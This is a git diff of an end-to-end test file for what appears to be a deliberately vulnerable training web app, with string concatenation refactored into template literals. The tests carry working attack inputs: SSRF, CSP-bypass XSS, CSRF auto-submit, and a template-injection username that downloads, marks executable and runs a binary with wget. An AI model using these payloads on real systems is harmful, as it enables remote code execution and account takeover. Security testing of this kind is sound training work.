@@ -9,17 +9,17 @@ const utils = require('../../lib/utils')
 describe('/profile', () => {
   let username, submitButton, url, setProfileImageButton
 
-  protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: 'admin123' })
+  protractor.beforeEach.login({ email: `admin@${config.get('application.domain')}`, password: 'admin123' })
 
   describe('challenge "ssrf"', () => {
     it('should be possible to request internal resources using image upload URL', () => {
       browser.waitForAngularEnabled(false)
-      browser.get(protractor.basePath + '/profile')
+      browser.get(`${protractor.basePath}/profile`)
       url = element(by.id('url'))
       submitButton = element(by.id('submitUrl'))
-      url.sendKeys(browser.baseUrl + '/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3')
+      url.sendKeys(`${browser.baseUrl}/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3`)
       submitButton.click()
-      browser.get(protractor.basePath + '/')
+      browser.get(`${protractor.basePath}/`)
       browser.driver.sleep(5000)
       browser.waitForAngularEnabled(true)
     })
@@ -30,7 +30,7 @@ describe('/profile', () => {
     describe('challenge "usernameXss"', () => {
       it('Username field should be susceptible to XSS attacks after disarming CSP via profile image URL', () => {
         browser.waitForAngularEnabled(false)
-        browser.get(protractor.basePath + '/profile')
+        browser.get(`${protractor.basePath}/profile`)
 
         const EC = protractor.ExpectedConditions
         url = element(by.id('url'))
@@ -50,10 +50,10 @@ describe('/profile', () => {
         username.clear()
         username.sendKeys('αδмιη') // disarm XSS
         submitButton.click()
-        url.sendKeys(browser.baseUrl + '/assets/public/images/uploads/default.svg')
+        url.sendKeys(`${browser.baseUrl}/assets/public/images/uploads/default.svg`)
         setProfileImageButton.click()
         browser.driver.sleep(5000)
-        browser.get(protractor.basePath + '/#/')
+        browser.get(`${protractor.basePath}/#/`)
         browser.waitForAngularEnabled(true)
       })
       protractor.expect.challengeSolved({ challenge: 'CSP Bypass' })
@@ -62,15 +62,15 @@ describe('/profile', () => {
     describe('challenge "ssti"', () => {
       it('should be possible to inject arbitrary nodeJs commands in username', () => {
         browser.waitForAngularEnabled(false)
-        browser.get(protractor.basePath + '/profile')
+        browser.get(`${protractor.basePath}/profile`)
         username = element(by.id('username'))
         submitButton = element(by.id('submit'))
         username.sendKeys('#{global.process.mainModule.require(\'child_process\').exec(\'wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware\')}')
         submitButton.click()
 
-        browser.get(protractor.basePath + '/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3')
+        browser.get(`${protractor.basePath}/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3`)
 
-        browser.get(protractor.basePath + '/')
+        browser.get(`${protractor.basePath}/`)
         browser.driver.sleep(10000)
         browser.waitForAngularEnabled(true)
       })
@@ -85,7 +85,7 @@ describe('/profile', () => {
       browser.driver.sleep(1000)
       /* The script executed below is equivalent to pasting this string into http://htmledit.squarefree.com: */
       /* <form action="http://localhost:3000/profile" method="POST"><input type="hidden" name="username" value="CSRF"/><input type="submit"/></form><script>document.forms[0].submit();</script> */
-      browser.executeScript("document.getElementsByName('editbox')[0].contentDocument.getElementsByName('ta')[0].value = \"<form action=\\\"" + browser.baseUrl + '/profile\\" method=\\"POST\\"><input type=\\"hidden\\" name=\\"username\\" value=\\"CSRF\\"/><input type=\\"submit\\"/></form><script>document.forms[0].submit();</script>"')
+      browser.executeScript(`document.getElementsByName('editbox')[0].contentDocument.getElementsByName('ta')[0].value = "<form action=\\"${browser.baseUrl}/profile\\" method=\\"POST\\"><input type=\\"hidden\\" name=\\"username\\" value=\\"CSRF\\"/><input type=\\"submit\\"/></form><script>document.forms[0].submit();</script>"`)
       browser.driver.sleep(5000)
       browser.waitForAngularEnabled(true)
     })
@@ -104,7 +104,7 @@ describe('/profile', () => {
         const formData = new FormData()
         formData.append('username', 'CSRF')
 
-        xhttp.open('POST', baseUrl + '/profile')
+        xhttp.open('POST', `${baseUrl}/profile`)
         xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded')
         xhttp.setRequestHeader('Origin', 'http://htmledit.squarefree.com') // FIXME Not allowed by browser due to "unsafe header not permitted"
         xhttp.setRequestHeader('Cookie', `token=${localStorage.getItem('token')}`) // FIXME Not allowed by browser due to "unsafe header not permitted"
